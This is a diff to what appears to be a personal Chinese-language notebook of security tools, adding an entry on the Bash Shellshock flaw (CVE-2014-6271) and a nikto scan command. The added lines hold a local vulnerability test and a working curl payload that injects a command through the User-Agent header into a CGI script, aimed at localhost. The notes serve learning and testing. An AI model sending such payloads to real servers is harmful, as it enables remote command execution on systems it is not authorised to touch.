@@ -789,3 +789,15 @@ skipfish
 skipfish是一款有google出品的漏洞扫描工具，基于命令行模式下工作
 * 基于异常的入侵检测系统SuStorID
   把机器学习和入侵检测结合起来，有空研究一下。
+* CVE-2014-6271 Bash远程执行漏洞
+  本机执行：
+  $ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+  若出现vulnerable，则有漏洞
+
+  apache:
+  curl -A "() { test;};/bin/touch /tmp/vulnerable" http://127.0.0.1/cgi-bin/test-cgi
+  若存在漏洞，则可以成功在服务上创建/tmp/vulnerable文件
+  可以执行任意命令。OH！
+
+* nikto 开源web server漏洞扫描工具
+  nikto -host 127.0.0.1
